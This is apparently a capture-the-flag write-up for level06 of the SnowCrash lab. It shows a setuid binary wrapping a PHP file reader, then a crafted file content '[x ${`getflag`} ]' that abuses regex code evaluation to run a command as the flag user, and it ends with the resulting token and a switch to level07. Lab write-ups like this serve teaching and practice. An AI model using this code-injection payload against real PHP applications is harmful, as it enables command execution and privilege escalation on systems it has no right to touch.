## level06:

At this level, I found two files: one binary file and one PHP script.

```bash
level06@SnowCrash:~$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$
```

The `level06.php` script is designed to reading the File Conten**t** and Printing the Result

```bash
level06@SnowCrash:~$ echo 'hhhhhhhh' > /tmp/file
level06@SnowCrash:~$ ./level06 /tmp/file
hhhhhhhh
level06@SnowCrash:~$
```

Now I am going to create a file containing a shell script to get the flag

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`} ]' > /tmp/getflag
level06@SnowCrash:~$ cat /tmp/getflag
[x ${getflag} ]
level06@SnowCrash:~$
```

```bash
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$
```

the password of the next level is : wiok45aaoguiboiki2tuin6ub

```bash
level06@SnowCrash:~$ su level07
Password: wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$
```

##